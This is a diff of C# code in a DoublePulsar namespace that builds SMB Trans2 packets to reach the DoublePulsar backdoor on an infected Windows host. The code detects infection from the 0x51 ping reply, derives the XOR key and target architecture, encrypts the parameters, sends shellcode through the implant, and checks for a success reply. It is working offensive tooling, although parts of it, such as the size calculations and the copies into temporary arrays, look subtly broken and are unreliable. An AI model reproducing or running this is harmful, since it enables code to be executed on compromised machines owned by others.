@@ -143,13 +143,14 @@ namespace DoublePulsar
             //SMBData added manually
         }
 
-        static public byte[] MakeTrans2Packet(ushort TID, ushort UID, byte[] parameters, byte[] encrypted_payload)
+        static public byte[] MakeTrans2Packet(Socket sock, ushort TID, ushort UID, byte[] param, byte[] encrypted_payload)
         {
-            //figure this out here
+            //figure this out here ??
+            /*
             NETBIOS_HEADER NTHeader = new NETBIOS_HEADER
             {
                 MessageTypeAndSize = 0x35100000
-            };
+            };*/
 
             SMB_HEADER header = new SMB_HEADER
             {
@@ -166,17 +167,14 @@ namespace DoublePulsar
                 TID = TID,
                 PIDLow = 0xfeff,
                 UID = UID,
-                MID = 0x0040
+                MID = 0x0042
             };
-            byte[] headerBytes = GetBytes(NTHeader).Concat(GetBytes(header)).ToArray();
-
+            //byte[] headerBytes = GetBytes(NTHeader).Concat(GetBytes(header)).ToArray();
+            byte[] headerBytes = GetBytes(header);
 
             //uint doublepulsar_execute_timeout_command = 0x001a8925;
             //doublepulsar_execute_timeout_command = IPAddress.HostToNetworkOrder(doublepulsar_execute_timeout_command);
 
-            ushort TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
-            ushort ByteCountLocal = (ushort)TotalDataCount;
-            ByteCountLocal += 13;
             SMB_COM_TRANSACTION2_SECONDARY_REQUEST transaction2SecondaryRequest = new SMB_COM_TRANSACTION2_SECONDARY_REQUEST
             {
                 WordCount = 15,
@@ -194,7 +192,7 @@ namespace DoublePulsar
                 //where in the packet is the location of the parameters
                 //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> < PARAMETERS ARE HERE >
                 ParameterOffset = 0x0042, //0x0035 OR ParameterDisplacement (NETBIOS) + (SMB) + (transaction2SecondaryRequest) -> (parameters=12)
-                DataCount = TotalDataCount,
+                DataCount = 0, //will be updated with the values below
 
                 //where in the packet is the location of the SMBDATA
                 //(NETBIOS) + (SMB) + (transaction2SecondaryRequest) + (PARAMETERS) -> < SMBDATA IS HERE>
@@ -202,41 +200,56 @@ namespace DoublePulsar
                 setupcount = 1, //0x01;
                 reserved3 = 0x00,
                 subcommand = 0x000E,
-                ByteCount = ByteCountLocal,
+                ByteCount = 0, //will be updated with the values below
                 padding = 0x00
             };
+
+            //ushort TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
+            //ushort ByteCountLocal = (ushort)TotalDataCount;
+            //ByteCountLocal += 13;
+
+            transaction2SecondaryRequest.TotalDataCount = (ushort)Marshal.SizeOf(encrypted_payload);
+            transaction2SecondaryRequest.DataCount = (ushort)Marshal.SizeOf(encrypted_payload);
+
+            int byteCountOfEncryptedPayload = Marshal.SizeOf(encrypted_payload) + 13;
+            transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
 
             //update timeout to be DoublePulsar EXEC command
             //int timeout = (time * 16) + 3;
             //transaction2SecondaryRequest.DataDisplacement = BitConverter.ToUInt16(new byte[] { 0xd0, BitConverter.GetBytes(timeout)[0] }, 0);
-            
+
             //Merge SMBHeader with the transaction2SecondaryRequest
             byte[] transaction2SecondaryRequestBytes = GetBytes(transaction2SecondaryRequest);
             byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestBytes).ToArray();
 
             List<byte> Parameters = new List<byte>();
             Parameters.AddRange(Enumerable.Repeat((byte)0x00, 12));
-            
+
+            //convert params to byte
+            byte[] paramBytes = GetBytes(param);
+
             //copy doublepulsar parameters to parameters here
-            Array.Copy(parameters, Parameters, 12);
-            
+            Array.Copy(paramBytes, Parameters.ToArray(), 12);
+
             //append the parameteters to the end of pkt
             pkt = pkt.Concat(Parameters.ToArray()).ToArray(); //Collect it all
 
             //SMBData dynamic generation
-            int DataSize = Marshall.Sizeof(encrypted_payload);
-            
+            int DataSize = Marshal.SizeOf(encrypted_payload);
+
             List<byte> SMBData = new List<byte>();
-            SMBData.AddRange(Enumerable.Repeat((byte)0x00, 4096));
+            SMBData.AddRange(Enumerable.Repeat((byte)0x00, DataSize));
             //SMBData.AddRange(Enumerable.Repeat((byte)0x00, DataSize));
 
             //copy doublepulsar exec data to SMBData here
-            Array.Copy(encrypted_payload, SMBData, DataSize);
-            
+            Array.Copy(encrypted_payload, SMBData.ToArray(), DataSize);
+
             //append it to the end of pkt
             pkt = pkt.Concat(SMBData.ToArray()).ToArray(); //Collect it all
 
-            return pkt;
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
+            //return pkt;
         }
 
 
@@ -632,15 +645,15 @@ namespace DoublePulsar
             byte[] readedBytes;
             byte[] xoredBytes;
 
-           readedBytes = new byte[message.Length];
-           xoredBytes = new byte[message.Length];
-           Array.Copy(message, readedBytes, message.Length);
+            readedBytes = new byte[message.Length];
+            xoredBytes = new byte[message.Length];
+            Array.Copy(message, readedBytes, message.Length);
 
             for (int i = 0; i < readedBytes.Length; i++)
-          {
-              int xoredInt = readedBytes[i] ^ key;
-              xoredBytes[i] = (byte)xoredInt;
-          }
+            {
+                int xoredInt = readedBytes[i] ^ key;
+                xoredBytes[i] = (byte)xoredInt;
+            }
 
             return xoredBytes;
         }
@@ -693,12 +706,13 @@ namespace DoublePulsar
             header = SMB_HeaderFromBytes(pingrequestresponse);
 
             //https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
-            byte[] final_response = pingrequestresponse;
+            //byte[] final_response = pingrequestresponse;
 
             // Check for 0x51 response to indicate DOUBLEPULSAR infection
-            if (final_response[34] == 0x51)
+            //if (final_response[34] == 0x51)
+            if (header.MID == 0x51)
             {
-                byte[] signature = Slice(final_response, 18, 4);
+                byte[] signature = Slice(pingrequestresponse, 18, 4);
                 UInt32 signature_long = LE2INT(signature);
                 UInt32 key = calculate_doublepulsar_xor_key(signature_long);
                 string arch = calculate_doublepulsar_arch(signature_long);
@@ -710,10 +724,10 @@ namespace DoublePulsar
                 byte[] payload_shellcode = XorDecryptFunc(shellcode, (int)key);
 
                 //Build DoublePulsar payload packet
-               // byte[] doublepulsar_parameters = new byte[12];
+                // byte[] doublepulsar_parameters = new byte[12];
                 int size = Marshal.SizeOf(shellcode);
-                int chunk_size = 4096;
-                int offset = 0x00;
+                int chunk_size = Marshal.SizeOf(shellcode);
+                int offset = 0x00000000;
                 //copy them to doublepulsar_parameters
                 /*
                 https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
@@ -752,19 +766,29 @@ namespace DoublePulsar
                 byte[] byte_doublepulsar_parameters = doublepulsar_parameters.ToArray().ToArray();
                 byte[] xor_doublepulsar_parameters = XorDecryptFunc(byte_doublepulsar_parameters, (int)key);
 
-                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, xor_doublepulsar_parameters, shellcode);
+                byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(sock, header.TID, header.UID, xor_doublepulsar_parameters, payload_shellcode);
+                header = SMB_HeaderFromBytes(doublepulsar_exploit_pkt);
+                if (header.MID == 0x82)
+                {
+                    Console.WriteLine("It appears that DoublePulsar processed the command successfully!\n");
+                }
+                else
+                {
+                    Console.WriteLine("an error occured and it does not appear that DoublePulsar ran successfully\n");
+                }
 
-                try
-                {
-                    SendSMBMessage(sock, doublepulsar_exploit_pkt, false);
-                    response = ReceiveSMBMessage(sock);
-                    header = new SMB_HEADER();
-                    header = SMB_HeaderFromBytes(response);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine("Socket error, this might end badly" + e.Message);
-                }
+                /*
+              try
+              {
+                  SendSMBMessage(sock, doublepulsar_exploit_pkt, false);
+                  response = ReceiveSMBMessage(sock);
+                  header = new SMB_HEADER();
+                  header = SMB_HeaderFromBytes(response);
+              }
+              catch (Exception e)
+              {
+                  Console.WriteLine("Socket error, this might end badly" + e.Message);
+              }*/
             }
 
             client.Close();
